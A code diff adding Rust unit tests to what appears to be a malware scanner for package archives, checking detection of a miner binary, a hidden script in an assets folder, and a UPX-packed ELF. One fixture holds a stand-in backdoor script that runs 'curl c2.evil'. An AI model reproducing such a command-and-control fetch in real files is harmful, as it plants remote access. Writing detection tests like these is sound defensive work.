@@ -234,4 +234,80 @@ mod tests {
             "Expected de-obfuscation to unmask the hidden Discord webhook, got: {findings:?}"
         );
     }
+
+    fn create_test_tar_gz(filename: &str, content: &[u8]) -> Vec<u8> {
+        use flate2::Compression;
+        use flate2::write::GzEncoder;
+        use std::io::Write;
+
+        let mut tar_bytes = Vec::new();
+        let mut header = [0u8; 512];
+        let name_bytes = filename.as_bytes();
+        header[..name_bytes.len().min(100)]
+            .copy_from_slice(&name_bytes[..name_bytes.len().min(100)]);
+        header[100..108].copy_from_slice(b"0000755\0");
+        let size_octal = format!("{:011o}\0", content.len());
+        header[124..136].copy_from_slice(size_octal.as_bytes());
+        header[156] = b'0';
+
+        let mut chk: u32 = 8 * b' ' as u32;
+        for &b in &header[..148] {
+            chk += b as u32;
+        }
+        for &b in &header[156..512] {
+            chk += b as u32;
+        }
+        let chk_str = format!("{:06o}\0 ", chk);
+        header[148..156].copy_from_slice(chk_str.as_bytes());
+
+        tar_bytes.extend_from_slice(&header);
+        tar_bytes.extend_from_slice(content);
+        let pad = (512 - (content.len() % 512)) % 512;
+        tar_bytes.resize(tar_bytes.len() + pad + 1024, 0);
+
+        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
+        encoder.write_all(&tar_bytes).unwrap();
+        encoder.finish().unwrap()
+    }
+
+    #[test]
+    fn inspect_tar_detects_miner_binary() {
+        let gz = create_test_tar_gz("bin/xmrig", b"fake binary miner contents");
+        let findings = inspect_tar_stream(&gz);
+        assert!(findings.iter().any(|f| f.rule_id == "ARCHIVE_MINER_BINARY"));
+    }
+
+    #[test]
+    fn inspect_tar_detects_hidden_script_in_assets() {
+        let gz = create_test_tar_gz("share/assets/backdoor.sh", b"#!/bin/bash\ncurl c2.evil\n");
+        let findings = inspect_tar_stream(&gz);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION")
+        );
+    }
+
+    #[test]
+    fn inspect_tar_detects_upx_packed_elf() {
+        let mut elf_data = vec![0x7f, b'E', b'L', b'F'];
+        elf_data.extend(b"somecode");
+        elf_data.extend(b"UPX!");
+        elf_data.extend(b"morepackedcode");
+        let gz = create_test_tar_gz("bin/packed_daemon", &elf_data);
+        let findings = inspect_tar_stream(&gz);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "ARCHIVE_UPX_PACKED_ELF")
+        );
+    }
+
+    #[test]
+    fn entropy_handles_empty_and_uniform() {
+        assert_eq!(shannon_entropy(""), 0.0);
+        assert_eq!(shannon_entropy("aaaaaaa"), 0.0);
+        // 4 different characters equally distributed has log2(4) = 2.0 entropy
+        assert!((shannon_entropy("abcd") - 2.0).abs() < 1e-6);
+    }
 }
